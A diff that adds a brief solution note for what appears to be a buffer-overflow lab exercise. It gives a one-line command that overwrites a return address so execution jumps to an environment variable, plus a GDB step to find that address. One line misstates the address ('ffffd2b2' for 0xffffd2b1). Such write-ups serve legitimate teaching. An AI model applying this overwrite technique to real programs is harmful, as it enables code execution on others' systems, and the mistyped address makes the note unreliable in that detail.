@@ -1,0 +1,11 @@
+To solve this one use:
+
+    ./target $(python -c "print 'AAABBBCCCDDDEEEFFFGGGHHHIIIJ\xb1\xd2\xff\xff'")
+
+The environment variable is located at 0xffffd2b1 for me, but for any environment, in GDB use:
+    
+    x/s *((char **) environ)
+
+Then you must write each pair of address value backwards so ffffd2b2 breaks into ff ff d2 b1.
+Each pair is in reversed order and written with a \x to mean hex.  So it would be \xb1 \xd2 \xff \xff.
+This overwrites the registers so that you are forced to jump to the env variable section. 
